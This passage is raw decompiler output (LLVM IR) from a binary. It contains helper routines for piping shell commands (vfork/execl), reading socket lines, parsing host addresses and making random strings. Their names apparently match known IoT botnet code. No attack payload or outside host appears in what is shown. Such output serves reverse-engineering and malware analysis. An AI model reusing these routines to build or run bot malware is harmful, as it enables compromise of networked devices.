  %v4_8e04 = call i32 @print(i32* nonnull %stack_var_-44, i32 %arg2, i32 %v2_8de4)
  %v3_8e0c = call i32 @strlen(i8* %v2_8dd8)
  %v2_8e1c = add i32 %v3_8e0c, %v1_8dbc
  %v3_8e24 = inttoptr i32 %v2_8e1c to i8*
  store i8 10, i8* %v3_8e24, align 1
  %v3_8e2c = call i32 @strlen(i8* %v2_8dd8)
  %v4_8e44 = call i32 @__libc_send(i32 %arg1, i32 %v1_8dbc, i32 %v3_8e2c, i32 16384)
  store i32 %v1_8dbc, i32* @r0, align 4
  %v0_8e54 = call i32 @free()
  store i32 %v3_8da8, i32* @fp, align 4
  ret i32 %v4_8e44

; uselistorder directives
  uselistorder i8* %v2_8dd8, { 1, 0, 2 }
  uselistorder i32 %v1_8dbc, { 1, 2, 0, 3, 4 }
  uselistorder i32* %stack_var_-16, { 1, 0 }
  uselistorder i32* %stack_var_-8, { 1, 0 }
}

define i32 @fdpopen(i32 %arg1, i8* %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg2 to i32
  %tmp4 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-32 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v3_8e70 = load i32, i32* @fp, align 4
  store i32 36472, i32* %stack_var_-4, align 4
  %v2_8e74 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_8e74, i32* @fp, align 4
  %v2_8e88 = load i8, i8* %arg2, align 1
  %v7_8e8c = icmp eq i8 %v2_8e88, 114
  br i1 %v7_8e8c, label %dec_label_pc_8ea4, label %dec_label_pc_8e94

dec_label_pc_8e94:                                ; preds = %entry
  %v2_8e98 = load i8, i8* %arg2, align 1
  %v7_8e9c = icmp eq i8 %v2_8e98, 119
  br i1 %v7_8e9c, label %dec_label_pc_8ea4, label %dec_label_pc_8eb8

dec_label_pc_8ea4:                                ; preds = %dec_label_pc_8e94, %entry
  %v1_8ea8 = add i32 %tmp, 1
  %v1_8eac = inttoptr i32 %v1_8ea8 to i8*
  %v2_8eac = load i8, i8* %v1_8eac, align 1
  %v2_8eb0 = icmp eq i8 %v2_8eac, 0
  br i1 %v2_8eb0, label %dec_label_pc_8ec4, label %dec_label_pc_8eb8

dec_label_pc_8eb8:                                ; preds = %dec_label_pc_8e94, %dec_label_pc_8ea4
  br label %dec_label_pc_90d0

dec_label_pc_8ec4:                                ; preds = %dec_label_pc_8ea4
  %v2_8ec4 = ptrtoint i32* %stack_var_-32 to i32
  %v1_8ecc = call i32 @__GI_pipe(i32 %v2_8ec4)
  store i32 %v1_8ecc, i32* @r0, align 4
  %v1_8ed4 = icmp slt i32 %v1_8ecc, 0
  br i1 %v1_8ed4, label %dec_label_pc_8edc, label %dec_label_pc_8ee8

dec_label_pc_8edc:                                ; preds = %dec_label_pc_8ec4
  br label %dec_label_pc_90d0

dec_label_pc_8ee8:                                ; preds = %dec_label_pc_8ec4
  %v2_8eec = load i32, i32* @global_var_2b938.33, align 4
  %v2_8ef0 = icmp eq i32 %v2_8eec, 0
  br i1 %v2_8ef0, label %dec_label_pc_8ef8, label %dec_label_pc_8f78

dec_label_pc_8ef8:                                ; preds = %dec_label_pc_8ee8
  %v0_8ef8 = call i32 @getdtablesize()
  %v5_8f0c = icmp sgt i32 %v0_8ef8, 0
  br i1 %v5_8f0c, label %dec_label_pc_8f1c, label %dec_label_pc_8f10

dec_label_pc_8f10:                                ; preds = %dec_label_pc_8ef8
  br label %dec_label_pc_90d0

dec_label_pc_8f1c:                                ; preds = %dec_label_pc_8ef8
  %v3_8f20 = mul i32 %v0_8ef8, 4
  %v1_8f28 = call i32 @malloc(i32 %v3_8f20)
  store i32 %v1_8f28, i32* @global_var_2b938.33, align 4
  %v2_8f44 = icmp eq i32 %v1_8f28, 0
  br i1 %v2_8f44, label %dec_label_pc_8f4c, label %dec_label_pc_8f58

dec_label_pc_8f4c:                                ; preds = %dec_label_pc_8f1c
  br label %dec_label_pc_90d0

dec_label_pc_8f58:                                ; preds = %dec_label_pc_8f1c
  store i32 %v3_8f20, i32* @r2, align 4
  %v2_8f74 = inttoptr i32 %v1_8f28 to i8*
  %v3_8f74 = call i32 @__GI_memset(i8* %v2_8f74, i32 0)
  store i32 %v3_8f74, i32* @r0, align 4
  br label %dec_label_pc_8f78

dec_label_pc_8f78:                                ; preds = %dec_label_pc_8ee8, %dec_label_pc_8f58
  %v0_8f78 = call i32 @__vfork()
  %v7_8f90 = icmp eq i32 %v0_8f78, -1
  br i1 %v7_8f90, label %dec_label_pc_8fa8, label %dec_label_pc_8f98

dec_label_pc_8f98:                                ; preds = %dec_label_pc_8f78
  %v2_8f9c = icmp eq i32 %v0_8f78, 0
  br i1 %v2_8f9c, label %dec_label_pc_8fcc, label %dec_label_pc_906c

dec_label_pc_8fa8:                                ; preds = %dec_label_pc_8f78
  %v3_8fa8 = load i32, i32* %stack_var_-32, align 4
  %v1_8fb0 = call i32 @__GI_close(i32 %v3_8fa8)
  %v1_8fbc = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_90d0

dec_label_pc_8fcc:                                ; preds = %dec_label_pc_8f98
  %v3_8fd0 = load i8, i8* %arg2, align 1
  %v7_8fd4 = icmp eq i8 %v3_8fd0, 114
  br i1 %v7_8fd4, label %dec_label_pc_8fdc, label %dec_label_pc_9014

dec_label_pc_8fdc:                                ; preds = %dec_label_pc_8fcc
  %v7_8fe0 = icmp eq i32 %tmp4, 1
  br i1 %v7_8fe0, label %dec_label_pc_9004, label %dec_label_pc_8fe8

dec_label_pc_8fe8:                                ; preds = %dec_label_pc_8fdc
  %v4_8ff4 = call i32 @dup2(i32 %tmp4, i32 1, i32 %tmp)
  %v1_9000 = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_9004

dec_label_pc_9004:                                ; preds = %dec_label_pc_8fdc, %dec_label_pc_8fe8
  %v3_9004 = load i32, i32* %stack_var_-32, align 4
  %v1_900c = call i32 @__GI_close(i32 %v3_9004)
  br label %dec_label_pc_9048

dec_label_pc_9014:                                ; preds = %dec_label_pc_8fcc
  %v3_9014 = load i32, i32* %stack_var_-32, align 4
  %v2_9018 = icmp eq i32 %v3_9014, 0
  br i1 %v2_9018, label %dec_label_pc_903c, label %dec_label_pc_9020

dec_label_pc_9020:                                ; preds = %dec_label_pc_9014
  %v4_902c = call i32 @dup2(i32 %v3_9014, i32 0, i32 %tmp)
  %v3_9030 = load i32, i32* %stack_var_-32, align 4
  %v1_9038 = call i32 @__GI_close(i32 %v3_9030)
  br label %dec_label_pc_903c

dec_label_pc_903c:                                ; preds = %dec_label_pc_9014, %dec_label_pc_9020
  %v1_9044 = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_9048

dec_label_pc_9048:                                ; preds = %dec_label_pc_9004, %dec_label_pc_903c
  %v8_9060 = call i32 @execl(i32 ptrtoint ([8 x i8]* @global_var_1c798.35 to i32), i32 ptrtoint ([3 x i8]* @global_var_1c7a0.37 to i32), i32 ptrtoint ([3 x i8]* @global_var_1c7a4.39 to i32), i32 %arg1, i32 0)
  %v1_9068 = call i32 @__GI__exit(i32 127)
  br label %dec_label_pc_906c

dec_label_pc_906c:                                ; preds = %dec_label_pc_8f98, %dec_label_pc_9048
  %v2_9070 = load i8, i8* %arg2, align 1
  %v7_9074 = icmp eq i8 %v2_9070, 114
  br i1 %v7_9074, label %dec_label_pc_907c, label %dec_label_pc_9094

dec_label_pc_907c:                                ; preds = %dec_label_pc_906c
  %v3_907c = load i32, i32* %stack_var_-32, align 4
  %v1_908c = call i32 @__GI_close(i32 %tmp4)
  br label %dec_label_pc_90a8

dec_label_pc_9094:                                ; preds = %dec_label_pc_906c
  %v3_909c = load i32, i32* %stack_var_-32, align 4
  %v1_90a4 = call i32 @__GI_close(i32 %v3_909c)
  br label %dec_label_pc_90a8

dec_label_pc_90a8:                                ; preds = %dec_label_pc_907c, %dec_label_pc_9094
  %stack_var_-40.0 = phi i32 [ %v3_907c, %dec_label_pc_907c ], [ %tmp4, %dec_label_pc_9094 ]
  %v3_90ac = mul i32 %stack_var_-40.0, 4
  %v2_90b8 = load i32, i32* @global_var_2b938.33, align 4
  %v2_90bc = add i32 %v2_90b8, %v3_90ac
  %v2_90c4 = inttoptr i32 %v2_90bc to i32*
  store i32 %v0_8f78, i32* %v2_90c4, align 4
  br label %dec_label_pc_90d0

dec_label_pc_90d0:                                ; preds = %dec_label_pc_8fa8, %dec_label_pc_8f4c, %dec_label_pc_8f10, %dec_label_pc_8edc, %dec_label_pc_8eb8, %dec_label_pc_90a8
  %stack_var_-44.0 = phi i32 [ -1, %dec_label_pc_8edc ], [ -1, %dec_label_pc_8f4c ], [ -1, %dec_label_pc_8fa8 ], [ %stack_var_-40.0, %dec_label_pc_90a8 ], [ -1, %dec_label_pc_8f10 ], [ -1, %dec_label_pc_8eb8 ]
  store i32 %v3_8e70, i32* @fp, align 4
  ret i32 %stack_var_-44.0

; uselistorder directives
  uselistorder i32 %stack_var_-40.0, { 1, 0 }
  uselistorder i32 %v0_8f78, { 1, 2, 0 }
  uselistorder i32 %v3_8f20, { 1, 0 }
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i32 %tmp4, { 0, 6, 5, 4, 3, 2, 1 }
  uselistorder i32 (i32, i32, i32)* @dup2, { 1, 0 }
  uselistorder i8* %arg2, { 1, 2, 0, 3, 4 }
  uselistorder label %dec_label_pc_90d0, { 5, 0, 1, 2, 3, 4 }
  uselistorder label %dec_label_pc_90a8, { 1, 0 }
  uselistorder label %dec_label_pc_906c, { 1, 0 }
  uselistorder label %dec_label_pc_9048, { 1, 0 }
  uselistorder label %dec_label_pc_903c, { 1, 0 }
  uselistorder label %dec_label_pc_9004, { 1, 0 }
  uselistorder label %dec_label_pc_8f78, { 1, 0 }
  uselistorder label %dec_label_pc_8eb8, { 1, 0 }
}

define i32 @fdpclose(i32 %arg1) local_unnamed_addr {
entry:
  %tmp5 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v2_910c = load i32, i32* @global_var_2b938.33, align 4
  %v2_9110 = icmp eq i32 %v2_910c, 0
  br i1 %v2_9110, label %dec_label_pc_9264, label %dec_label_pc_9118

dec_label_pc_9118:                                ; preds = %entry
  %v3_911c = mul i32 %arg1, 4
  %v2_912c = add i32 %v2_910c, %v3_911c
  %v1_9130 = inttoptr i32 %v2_912c to i32*
  %v2_9130 = load i32, i32* %v1_9130, align 4
  %v2_9134 = icmp eq i32 %v2_9130, 0
  br i1 %v2_9134, label %dec_label_pc_9264, label %dec_label_pc_9148

dec_label_pc_9148:                                ; preds = %dec_label_pc_9118
  %v1_914c = call i32 @__GI_close(i32 %arg1)
  %v2_9150 = ptrtoint i32* %stack_var_-36 to i32
  %v2_9158 = call i32 @sigemptyset(i32* nonnull %stack_var_-36)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9168 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 2)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9178 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 3)
  store i32 %v2_9150, i32* @r0, align 4
  %v2_9188 = call i32 @__GI_sigaddset(i32 %v2_9150, i32 1)
  %v2_9190 = ptrtoint i32* %stack_var_-28 to i32
  %v4_919c = call i32 @__GI_sigprocmask(i32 0, i32 %v2_9150, i32 %v2_9190, i32 %v2_9150)
  %v2_91bc = ptrtoint i32* %stack_var_-40 to i32
  br label %dec_label_pc_91a0

dec_label_pc_91a0:                                ; preds = %dec_label_pc_91e4, %dec_label_pc_9148
  %v2_91b0 = load i32, i32* @global_var_2b938.33, align 4
  %v2_91b4 = add i32 %v2_91b0, %v3_911c
  %v1_91b8 = inttoptr i32 %v2_91b4 to i32*
  %v2_91b8 = load i32, i32* %v1_91b8, align 4
  store i32 %v2_91b8, i32* @r0, align 4
  %v3_91cc = call i32 @__libc_waitpid(i32 %v2_91b8, i32 %v2_91bc, i32 0)
  %v3_91dc = icmp eq i32 %v3_91cc, -1
  %v8_91dc = icmp eq i32 %v3_91cc, -1
  br i1 %v3_91dc, label %dec_label_pc_91e4, label %dec_label_pc_91f8

dec_label_pc_91e4:                                ; preds = %dec_label_pc_91a0
  %v0_91e4 = call i32 @__GI___errno_location()
  %v1_91ec = inttoptr i32 %v0_91e4 to i32*
  %v2_91ec = load i32, i32* %v1_91ec, align 4
  %v7_91f0 = icmp eq i32 %v2_91ec, 4
  br i1 %v7_91f0, label %dec_label_pc_91a0, label %dec_label_pc_91f8

dec_label_pc_91f8:                                ; preds = %dec_label_pc_91a0, %dec_label_pc_91e4
  %v4_9208 = call i32 @__GI_sigprocmask(i32 2, i32 %v2_9190, i32 0, i32 %v2_9190)
  %v3_9210 = mul i32 %tmp5, 4
  %v2_921c = load i32, i32* @global_var_2b938.33, align 4
  %v2_9220 = add i32 %v2_921c, %v3_9210
  %v2_9228 = inttoptr i32 %v2_9220 to i32*
  store i32 0, i32* %v2_9228, align 4
  br i1 %v8_91dc, label %dec_label_pc_9264, label %dec_label_pc_9238

dec_label_pc_9238:                                ; preds = %dec_label_pc_91f8
  %v3_9238 = load i32, i32* %stack_var_-40, align 4
  %v1_9244 = and i32 %v3_9238, ptrtoint (i32* @global_var_ff00.41 to i32)
  %v3_9248 = sdiv i32 %v1_9244, 256
  br label %dec_label_pc_9264

dec_label_pc_9264:                                ; preds = %dec_label_pc_9238, %dec_label_pc_91f8, %entry, %dec_label_pc_9118
  %storemerge = phi i32 [ -1, %dec_label_pc_9118 ], [ -1, %entry ], [ %v3_9248, %dec_label_pc_9238 ], [ -1, %dec_label_pc_91f8 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %v2_9190, { 1, 0, 2 }
  uselistorder i32 %v2_9150, { 0, 1, 3, 2, 5, 4, 7, 6 }
  uselistorder i32 %v3_911c, { 1, 0 }
  uselistorder i32 (i32, i32)* @__GI_sigaddset, { 2, 1, 0 }
  uselistorder i32* @global_var_2b938.33, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_9264, { 0, 1, 3, 2 }
  uselistorder label %dec_label_pc_91f8, { 1, 0 }
}

define i32 @fdgets(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  store i32 %arg2, i32* @r1, align 4
  br label %dec_label_pc_92ec

dec_label_pc_92ac:                                ; preds = %dec_label_pc_92fc
  store i32 %v2_9308, i32* @r1, align 4
  %v1_92c8 = call i32 @__GI_read(i32 %arg3)
  %v1_92d8 = add nuw i32 %storemerge25, 1
  %v7_92e4 = icmp eq i32 %v1_92c8, 1
  br i1 %v7_92e4, label %dec_label_pc_92ec, label %dec_label_pc_931c

dec_label_pc_92ec:                                ; preds = %entry, %dec_label_pc_92ac
  %storemerge25 = phi i32 [ 0, %entry ], [ %v1_92d8, %dec_label_pc_92ac ]
  %v6_92f8 = icmp slt i32 %storemerge25, %arg2
  br i1 %v6_92f8, label %dec_label_pc_92fc, label %dec_label_pc_931c

dec_label_pc_92fc:                                ; preds = %dec_label_pc_92ec
  %v2_9308 = add i32 %storemerge25, %arg1
  %v1_930c = add i32 %v2_9308, -1
  %v1_9310 = inttoptr i32 %v1_930c to i8*
  %v2_9310 = load i8, i8* %v1_9310, align 1
  %v7_9314 = icmp eq i8 %v2_9310, 10
  br i1 %v7_9314, label %dec_label_pc_931c, label %dec_label_pc_92ac

dec_label_pc_931c:                                ; preds = %dec_label_pc_92fc, %dec_label_pc_92ec, %dec_label_pc_92ac
  %stack_var_-24.0.lcssa = phi i32 [ 1, %dec_label_pc_92fc ], [ 1, %dec_label_pc_92ec ], [ %v1_92c8, %dec_label_pc_92ac ]
  %v2_9320 = icmp eq i32 %stack_var_-24.0.lcssa, 0
  %storemerge3 = select i1 %v2_9320, i32 0, i32 %arg1
  ret i32 %storemerge3

; uselistorder directives
  uselistorder i32 %v2_9308, { 1, 0 }
  uselistorder i32 %v1_92c8, { 1, 0 }
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_92ec, { 1, 0 }
}

define i32 @parseHex(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = ptrtoint i8* %arg1 to i32
  %v2_93a43 = load i8, i8* %arg1, align 1
  %v2_93a85 = icmp eq i8 %v2_93a43, 0
  br i1 %v2_93a85, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_9370:                                ; preds = %dec_label_pc_93b0
  %v3_9374 = mul i32 %stack_var_-20.07, 16
  %v2_937c = load i8, i8* %stack_var_-28.06, align 1
  %v3_937c = zext i8 %v2_937c to i32
  %v4_9388 = mul nuw nsw i32 %v3_937c, 4
  %v5_9388 = add i32 %v4_9388, ptrtoint (i32* @global_var_1c7a8.43 to i32)
  %v6_9388 = inttoptr i32 %v5_9388 to i32*
  %v7_9388 = load i32, i32* %v6_9388, align 4
  %v2_938c = or i32 %v7_9388, %v3_9374
  %v1_9398 = add i32 %v4_93a08, 1
  %v5_939c = inttoptr i32 %v1_9398 to i8*
  %v2_93a4 = load i8, i8* %v5_939c, align 1
  %v2_93a8 = icmp eq i8 %v2_93a4, 0
  br i1 %v2_93a8, label %dec_label_pc_93bc, label %dec_label_pc_93b0

dec_label_pc_93b0:                                ; preds = %entry, %dec_label_pc_9370
  %v4_93a08 = phi i32 [ %v1_9398, %dec_label_pc_9370 ], [ %tmp, %entry ]
  %stack_var_-20.07 = phi i32 [ %v2_938c, %dec_label_pc_9370 ], [ 0, %entry ]
  %stack_var_-28.06 = phi i8* [ %v5_939c, %dec_label_pc_9370 ], [ %arg1, %entry ]
  %v1_93b4 = icmp slt i32 %stack_var_-20.07, 0
  br i1 %v1_93b4, label %dec_label_pc_93bc, label %dec_label_pc_9370

dec_label_pc_93bc:                                ; preds = %dec_label_pc_9370, %dec_label_pc_93b0, %entry
  %stack_var_-20.0.lcssa = phi i32 [ 0, %entry ], [ %v2_938c, %dec_label_pc_9370 ], [ %stack_var_-20.07, %dec_label_pc_93b0 ]
  ret i32 %stack_var_-20.0.lcssa

; uselistorder directives
  uselistorder i32 %stack_var_-20.07, { 1, 2, 0 }
  uselistorder label %dec_label_pc_93bc, { 1, 0, 2 }
  uselistorder label %dec_label_pc_93b0, { 1, 0 }
}

define i32 @wildString(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %tmp = inttoptr i32 %arg2 to i8*
  %tmp8 = ptrtoint i8* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v3_93d8 = load i32, i32* @r4, align 4
  %v6_93d8 = load i32, i32* @fp, align 4
  store i32 37856, i32* %stack_var_-4, align 4
  %v2_93dc = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_93dc, i32* @fp, align 4
  %v2_93f0 = load i8, i8* %arg1, align 1
  %v7_93fc = icmp eq i8 %v2_93f0, 42
  br i1 %v7_93fc, label %dec_label_pc_9430, label %dec_label_pc_9404

dec_label_pc_9404:                                ; preds = %entry
  %v7_9408 = icmp eq i8 %v2_93f0, 63
  br i1 %v7_9408, label %dec_label_pc_94a0, label %dec_label_pc_9410

dec_label_pc_9410:                                ; preds = %dec_label_pc_9404
  %v2_9414 = icmp eq i8 %v2_93f0, 0
  br i1 %v2_9414, label %dec_label_pc_9420, label %dec_label_pc_94f8

dec_label_pc_9420:                                ; preds = %dec_label_pc_9410
  %v2_9424 = load i8, i8* %tmp, align 1
  %v3_9424 = zext i8 %v2_9424 to i32
  br label %dec_label_pc_956c

dec_label_pc_9430:                                ; preds = %entry
  %v1_9434 = add i32 %tmp8, 1
  %v3_9440 = inttoptr i32 %v1_9434 to i8*
  %v4_9440 = call i32 @wildString(i8* %v3_9440, i32 %arg2)
  %v2_9448 = icmp eq i32 %v4_9440, 0
  br i1 %v2_9448, label %dec_label_pc_948c, label %dec_label_pc_9450

dec_label_pc_9450:                                ; preds = %dec_label_pc_9430
  %v2_9454 = load i8, i8* %tmp, align 1
  %v2_9458 = icmp eq i8 %v2_9454, 0
  br i1 %v2_9458, label %dec_label_pc_9494, label %dec_label_pc_9460

dec_label_pc_9460:                                ; preds = %dec_label_pc_9450
  %v1_9464 = add i32 %arg2, 1
  %v4_9470 = call i32 @wildString(i8* nonnull %arg1, i32 %v1_9464)
  %v2_9478 = icmp eq i32 %v4_9470, 0
  br i1 %v2_9478, label %dec_label_pc_948c, label %dec_label_pc_9494

dec_label_pc_948c:                                ; preds = %dec_label_pc_9460, %dec_label_pc_9430
  br label %dec_label_pc_9494

dec_label_pc_9494:                                ; preds = %dec_label_pc_9450, %dec_label_pc_9460, %dec_label_pc_948c
  %storemerge3 = phi i32 [ 0, %dec_label_pc_948c ], [ 1, %dec_label_pc_9460 ], [ 1, %dec_label_pc_9450 ]
  br label %dec_label_pc_956c

dec_label_pc_94a0:                                ; preds = %dec_label_pc_9404
  %v2_94a4 = load i8, i8* %tmp, align 1
  %v2_94a8 = icmp eq i8 %v2_94a4, 0
  br i1 %v2_94a8, label %dec_label_pc_94ec, label %dec_label_pc_94b0

dec_label_pc_94b0:                                ; preds = %dec_label_pc_94a0
  %v1_94b4 = add i32 %tmp8, 1
  %v1_94bc = add i32 %arg2, 1
  %v2_94c8 = inttoptr i32 %v1_94b4 to i8*
  %v3_94c8 = call i32 @wildString(i8* %v2_94c8, i32 %v1_94bc)
  %v2_94d0 = icmp ne i32 %v3_94c8, 0
  %. = zext i1 %v2_94d0 to i32
  br label %dec_label_pc_94ec

dec_label_pc_94ec:                                ; preds = %dec_label_pc_94b0, %dec_label_pc_94a0
  %storemerge2 = phi i32 [ 1, %dec_label_pc_94a0 ], [ %., %dec_label_pc_94b0 ]
  br label %dec_label_pc_956c

dec_label_pc_94f8:                                ; preds = %dec_label_pc_9410
  %v2_94fc = load i8, i8* %arg1, align 1
  %v3_94fc = zext i8 %v2_94fc to i32
  %v1_9504 = call i32 @__GI_toupper(i32 %v3_94fc)
  store i32 %v1_9504, i32* @r4, align 4
  %v2_9510 = load i8, i8* %tmp, align 1
  %v3_9510 = zext i8 %v2_9510 to i32
  %v1_9518 = call i32 @__GI_toupper(i32 %v3_9510)
  %v0_9520 = load i32, i32* @r4, align 4
  %v9_9520 = icmp eq i32 %v0_9520, %v1_9518
  br i1 %v9_9520, label %dec_label_pc_9528, label %dec_label_pc_9564

dec_label_pc_9528:                                ; preds = %dec_label_pc_94f8
  %v1_952c = add i32 %tmp8, 1
  %v1_9534 = add i32 %arg2, 1
  %v2_9540 = inttoptr i32 %v1_952c to i8*
  %v3_9540 = call i32 @wildString(i8* %v2_9540, i32 %v1_9534)
  %v2_9548 = icmp ne i32 %v3_9540, 0
  %.7 = zext i1 %v2_9548 to i32
  br label %dec_label_pc_9564

dec_label_pc_9564:                                ; preds = %dec_label_pc_9528, %dec_label_pc_94f8
  %storemerge = phi i32 [ 1, %dec_label_pc_94f8 ], [ %.7, %dec_label_pc_9528 ]
  br label %dec_label_pc_956c

dec_label_pc_956c:                                ; preds = %dec_label_pc_94ec, %dec_label_pc_9494, %dec_label_pc_9420, %dec_label_pc_9564
  %stack_var_-48.0 = phi i32 [ %storemerge3, %dec_label_pc_9494 ], [ %storemerge2, %dec_label_pc_94ec ], [ %v3_9424, %dec_label_pc_9420 ], [ %storemerge, %dec_label_pc_9564 ]
  store i32 %v3_93d8, i32* @r4, align 4
  store i32 %v6_93d8, i32* @fp, align 4
  ret i32 %stack_var_-48.0

; uselistorder directives
  uselistorder i32* %stack_var_-4, { 1, 0 }
  uselistorder i8* %tmp, { 0, 2, 3, 1 }
  uselistorder i32 %arg2, { 3, 2, 0, 1, 4 }
  uselistorder label %dec_label_pc_956c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_9494, { 2, 1, 0 }
}

define i32 @getHost(i32 %arg1, i32* %arg2) local_unnamed_addr {
entry:
  store i32 %arg1, i32* @r0, align 4
  %v1_95a0 = call i32 @inet_addr(i32 %arg1)
  store i32 %v1_95a0, i32* %arg2, align 4
  %v3_95b8 = icmp eq i32 %v1_95a0, -1
  %. = zext i1 %v3_95b8 to i32
  ret i32 %.

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
}

define i32 @uppercase(i8* %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v0_95f8 = load i32, i32* %r0.global-to-local, align 4
  %storemerge2 = inttoptr i32 %v0_95f8 to i8*
  %v2_96303 = load i8, i8* %storemerge2, align 1
  %v2_96345 = icmp eq i8 %v2_96303, 0
  br i1 %v2_96345, label %dec_label_pc_963c, label %dec_label_pc_9600

dec_label_pc_9600:                                ; preds = %entry, %dec_label_pc_9600
  %storemerge7 = phi i8* [ %storemerge, %dec_label_pc_9600 ], [ %storemerge2, %entry ]
  %storemerge.in6 = phi i32 [ %v1_9624, %dec_label_pc_9600 ], [ %v0_95f8, %entry ]
  %v2_9604 = load i8, i8* %storemerge7, align 1
  %v3_9604 = zext i8 %v2_9604 to i32
  store i32 %v3_9604, i32* %r0.global-to-local, align 4
  %v1_960c = call i32 @__GI_toupper(i32 %v3_9604)
  store i32 %v1_960c, i32* %r0.global-to-local, align 4
  %v1_961c = trunc i32 %v1_960c to i8
  store i8 %v1_961c, i8* %storemerge7, align 1
  %v1_9624 = add i32 %storemerge.in6, 1
  %storemerge = inttoptr i32 %v1_9624 to i8*
  %v2_9630 = load i8, i8* %storemerge, align 1
  %v2_9634 = icmp eq i8 %v2_9630, 0
  br i1 %v2_9634, label %dec_label_pc_962c.dec_label_pc_963c_crit_edge, label %dec_label_pc_9600

dec_label_pc_962c.dec_label_pc_963c_crit_edge:    ; preds = %dec_label_pc_9600
  %v1_9644.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_963c

dec_label_pc_963c:                                ; preds = %dec_label_pc_962c.dec_label_pc_963c_crit_edge, %entry
  %v1_9644 = phi i32 [ %v1_9644.pre, %dec_label_pc_962c.dec_label_pc_963c_crit_edge ], [ %v0_95f8, %entry ]
  ret i32 %v1_9644

; uselistorder directives
  uselistorder i8* %storemerge, { 1, 0 }
  uselistorder i32 %v1_9624, { 1, 0 }
  uselistorder i8* %storemerge7, { 1, 0 }
  uselistorder i32 %v0_95f8, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 2, 0, 1 }
  uselistorder label %dec_label_pc_9600, { 1, 0 }
}

define i32 @makeRandomStr(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %v3_964c = load i32, i32* @r4, align 4
  %v6_964c = load i32, i32* @fp, align 4
  %v0_9658 = load i32, i32* %r0.global-to-local, align 4
  %v5_96ec24 = icmp sgt i32 %arg2, 0
  br i1 %v5_96ec24, label %dec_label_pc_9674, label %dec_label_pc_96f0

dec_label_pc_9674:                                ; preds = %entry, %dec_label_pc_9674
  %storemerge725 = phi i32 [ %v1_96d8, %dec_label_pc_9674 ], [ 0, %entry ]
  %v2_9680 = add i32 %storemerge725, %v0_9658
  store i32 %v2_9680, i32* @r4, align 4
  %v0_9684 = call i32 @rand_cmwc()
  store i32 %v0_9684, i32* %r0.global-to-local, align 4
  %v3_9694 = udiv i32 %v0_9684, 26
  %tmp = mul nsw i32 %v3_9694, -2
  %v2_96b8 = add i32 %v0_9684, %tmp
  %fold = add i32 %v2_96b8, 65
  %v1_96d0 = trunc i32 %fold to i8
  %v2_96d0 = load i32, i32* @r4, align 4
  %v3_96d0 = inttoptr i32 %v2_96d0 to i8*
  store i8 %v1_96d0, i8* %v3_96d0, align 1
  %v1_96d8 = add nuw nsw i32 %storemerge725, 1
  %v5_96ec = icmp slt i32 %v1_96d8, %arg2
  br i1 %v5_96ec, label %dec_label_pc_9674, label %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge

dec_label_pc_96e0.dec_label_pc_96f0_crit_edge:    ; preds = %dec_label_pc_9674
  %v1_96f8.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_96f0

dec_label_pc_96f0:                                ; preds = %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge, %entry
  %v1_96f8 = phi i32 [ %v1_96f8.pre, %dec_label_pc_96e0.dec_label_pc_96f0_crit_edge ], [ %v0_9658, %entry ]
  store i32 %v3_964c, i32* @r4, align 4
  store i32 %v6_964c, i32* @fp, align 4
  ret i32 %v1_96f8

; uselistorder directives
  uselistorder i32 %v1_96d8, { 1, 0 }
  uselistorder i32* %r0.global-to-local, { 2, 3, 0, 1 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder label %dec_label_pc_9674, { 1, 0 }
}

define i32 @recvLine(i32 %arg1, i8* %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
dec_label_pc_9754.lr.ph:
  %tmp34 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-185 = alloca i8, align 1
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-176 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_9704 = load i32, i32* @fp, align 4
  store i32 %v3_9704, i32* %stack_var_-16, align 4
  store i32 38668, i32* %stack_var_-4, align 4
  %v2_9708 = ptrtoint i32* %stack_var_-4 to i32
  store i32 %v2_9708, i32* @fp, align 4
  store i32 %arg3, i32* @r2, align 4
  %v4_972c = call i32 @__GI_memset(i8* %arg2, i32 0)
  store i32 30, i32* %stack_var_-184, align 4
